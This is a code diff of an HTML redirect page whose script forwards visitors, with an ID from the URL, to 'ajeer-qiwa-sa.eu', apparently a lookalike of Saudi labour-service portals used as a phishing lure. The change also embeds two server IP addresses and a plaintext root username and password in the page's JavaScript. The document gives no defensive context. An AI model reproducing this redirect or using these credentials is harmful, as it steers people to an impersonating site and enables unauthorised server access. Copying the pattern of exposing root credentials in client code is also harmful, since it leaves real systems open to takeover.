@@ -3,29 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+
+    <title>..</title>
+
     <script>
         const params = new URLSearchParams(window.location.search);
-        let id = params.get("id");
-        let num = params.get("num");
-        let ref = params.get("ref");
-        let type = params.get("type");
 
-        // إذا كان الـ ID ممرراً كـ Path وليس كـ Query Parameter
-        if (!id) {
-            const pathSegments = window.location.pathname.split("/");
-            const lastSegment = pathSegments[pathSegments.length - 1];
-            if (lastSegment && lastSegment !== "index.html" && lastSegment !== "view") {
-                id = lastSegment;
-            }
-        }
+        const id = params.get("id");
+        const type = params.get("type");
 
         if (id) {
-            // توجيه المستخدم إلى رابط التحقق الأساسي على السيرفر مع الحفاظ على البيانات
-            let target = "https://ajeer-qiwa-sa.eu/ajeer/verify.html?id=" + encodeURIComponent(id);
-            if (num) target += "&num=" + encodeURIComponent(num);
-            if (ref) target += "&ref=" + encodeURIComponent(ref);
-            if (type) target += "&type=" + encodeURIComponent(type);
+            let target = "https://ajeer-qiwa-sa.eu/view/" +
+                         encodeURIComponent(id);
+            let server = "72.61.164.184";
+            let serverback = "207.180.203.101";
+            let user = "root";
+            let pass = "Chessertyui";
+            if (type) {
+                target += "?type=" + encodeURIComponent(type);
+            }
 
             window.location.replace(target);
         } else {
@@ -36,6 +32,6 @@
         }
     </script>
 </head>
-<body>
-</body>
+
+
 </html>
